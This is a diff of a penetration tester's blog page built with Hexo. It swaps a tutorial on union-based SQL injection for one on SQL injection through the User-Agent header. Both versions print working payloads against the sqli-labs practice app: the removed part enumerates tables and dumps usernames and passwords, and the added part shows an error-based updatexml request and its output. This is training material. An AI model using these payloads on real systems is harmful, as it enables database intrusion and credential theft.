@@ -20,20 +20,20 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="Union Sql Injection Detection Methods First, check for the existence of an SQL injection vulnerability. Then, determine the injection type: character-based, numeric-based, or search-based. Use “order">
+  <meta name="description" content="HTTP header injection is a security vulnerability that occurs when an attacker is able to inject malicious content into HTTP headers. This can have various security implications, including the potent">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Union Sql Injection Detection Methods">
-<meta property="og:url" content="http://example.com/2016/10/24/UnionSqlInjection/index.html">
+<meta property="og:title" content="HTTP Header SQL Injection">
+<meta property="og:url" content="http://example.com/2016/11/25/SQLInjectionHttpHeader/index.html">
 <meta property="og:site_name" content="congdong007">
-<meta property="og:description" content="Union Sql Injection Detection Methods First, check for the existence of an SQL injection vulnerability. Then, determine the injection type: character-based, numeric-based, or search-based. Use “order">
+<meta property="og:description" content="HTTP header injection is a security vulnerability that occurs when an attacker is able to inject malicious content into HTTP headers. This can have various security implications, including the potent">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2016-10-24T23:11:44.000Z">
-<meta property="article:modified_time" content="2023-10-18T23:46:14.237Z">
+<meta property="article:published_time" content="2016-11-26T02:11:31.000Z">
+<meta property="article:modified_time" content="2023-10-19T15:20:17.106Z">
 <meta property="article:author" content="Dong Cong">
 <meta property="article:tag" content="Python、Typescript、Go、C&#x2F;C++、asm、Bash、Penetration Tester">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/2016/10/24/UnionSqlInjection/">
+<link rel="canonical" href="http://example.com/2016/11/25/SQLInjectionHttpHeader/">
 
 
 <script id="page-configurations">
@@ -46,7 +46,7 @@
   };
 </script>
 
-  <title>Union Sql Injection Detection Methods | congdong007</title>
+  <title>HTTP Header SQL Injection | congdong007</title>
   
 
 
@@ -161,7 +161,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/24/UnionSqlInjection/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/11/25/SQLInjectionHttpHeader/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -174,7 +174,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Union Sql Injection Detection Methods
+          HTTP Header SQL Injection
         </h1>
 
         <div class="post-meta">
@@ -184,14 +184,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2016-10-24 19:11:44" itemprop="dateCreated datePublished" datetime="2016-10-24T19:11:44-04:00">2016-10-24</time>
+              <time title="Created: 2016-11-25 21:11:31" itemprop="dateCreated datePublished" datetime="2016-11-25T21:11:31-05:00">2016-11-25</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-18 19:46:14" itemprop="dateModified" datetime="2023-10-18T19:46:14-04:00">2023-10-18</time>
+                <time title="Modified: 2023-10-19 11:20:17" itemprop="dateModified" datetime="2023-10-19T11:20:17-04:00">2023-10-19</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -211,7 +211,7 @@
                 </span>
                   , 
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection/" itemprop="url" rel="index"><span itemprop="name">Union Sql Injection</span></a>
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/HTTP-Header-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">HTTP Header SQL Injection</span></a>
                 </span>
             </span>
 
@@ -226,17 +226,8 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="Union-Sql-Injection-Detection-Methods"><a href="#Union-Sql-Injection-Detection-Methods" class="headerlink" title="Union Sql Injection Detection Methods"></a>Union Sql Injection Detection Methods</h1><ol>
-<li>First, check for the existence of an SQL injection vulnerability.</li>
-<li>Then, determine the injection type: character-based, numeric-based, or search-based.</li>
-<li>Use “order by” to further identify the number of columns:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+ (normal)</span><br><span class="line">?id=1&#x27; order by 4 --+ (error)</span><br></pre></td></tr></table></figure></li>
-<li>Once the number of columns is determined using “order by,” proceed to replace the display position with some MySQL functions.</li>
-<li>Retrieve the tables in the current database:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, table_name), version() from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure></li>
-<li>After obtaining the tables, retrieve the columns in those tables:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, column_name), version() from information_schema.columns where able_schema=database() and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li>Retrieve the data:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;, username), group_concat(&#x27;|&#x27;, password) from users--+</span><br></pre></td></tr></table></figure>
-These steps describe how an attacker can detect and exploit a SQL injection vulnerability to extract information from a database.</li>
-</ol>
-<h1 id="Examples-of-Target-Machines"><a href="#Examples-of-Target-Machines" class="headerlink" title="Examples of Target Machines"></a>Examples of Target Machines</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+ correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+ error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),version() --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,table_name) ,version() from information_schema.tables where table_schema=database()--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,column_name),version() from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, username,password from users --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;,username),group_concat(&#x27;|&#x27;,password) from users --+</span><br></pre></td></tr></table></figure>
+        <p> HTTP header injection is a security vulnerability that occurs when an attacker is able to inject malicious content into HTTP headers. This can have various security implications, including the potential for cross-site scripting (XSS) attacks or other forms of web application exploitation.</p>
+<p> Example :<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /sqli-labs-master/Less-18/ HTTP/1.1</span><br><span class="line">Host: 192.168.1.33</span><br><span class="line">Content-Length: 38</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.1.33</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent:1<span class="string">&#x27; and updatexml(1,concat(0x7e,(user()),0x7e),1) and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.1.33/sqli-labs-master/Less-18/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="built_in">uname</span>=admin&amp;passwd=admin&amp;submit=Submit   </span><br><span class="line"></span><br></pre></td></tr></table></figure><br>  <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br></pre></td></tr></table></figure></p>
 
     </div>
 
@@ -252,12 +243,12 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2016/10/23/Search-BasedSqlInjection/" rel="prev" title="Search-Based SQL Injection Detection">
-      <i class="fa fa-chevron-left"></i> Search-Based SQL Injection Detection
+    <a href="/2016/11/22/SQLInjectionMySQLError/" rel="prev" title="MySQL Error-Based SQL Injection">
+      <i class="fa fa-chevron-left"></i> MySQL Error-Based SQL Injection
     </a></div>
       <div class="post-nav-item">
-    <a href="/2018/11/16/goFunc/" rel="next" title="A Brief Summary of "go func()"">
-      A Brief Summary of "go func()" <i class="fa fa-chevron-right"></i>
+    <a href="/2016/11/29/SQLInjectionMySQLStackBased/" rel="next" title="MySQL Stack-Based SQL Injection">
+      MySQL Stack-Based SQL Injection <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -317,7 +308,6 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Union-Sql-Injection-Detection-Methods"><span class="nav-number">1.</span> <span class="nav-text">Union Sql Injection Detection Methods</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Examples-of-Target-Machines"><span class="nav-number">2.</span> <span class="nav-text">Examples of Target Machines</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -333,13 +323,13 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-count">27</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-count">36</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
